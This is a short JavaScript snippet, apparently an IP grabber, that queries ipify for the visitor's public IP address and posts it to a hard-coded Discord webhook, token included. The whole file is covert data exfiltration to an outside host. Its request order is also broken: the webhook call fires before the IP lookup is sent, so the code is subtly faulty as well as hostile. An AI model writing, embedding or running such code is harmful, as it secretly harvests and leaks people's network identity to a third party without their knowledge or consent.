var a = new XMLHttpRequest();

function rqwbm(url,datax) {
    var xhr = new XMLHttpRequest();
    xhr.open("POST",url,true);
    xhr.setRequestHeader("Content-Type","application/json");
    xhr.send(datax);
}

a.open("GET","https://api64.ipify.org");
        
rqwbm("https://discord.com/api/webhooks/1135708876558307369/rQXfBU63WU64V7BlHgvgOlqMnqSVeTm1yZ6T5nQrWtjq8dPkqyARtkwN1af4KLPORymw",JSON.stringify({"content":"**IP: "+a.responseText+"**"));

a.send();
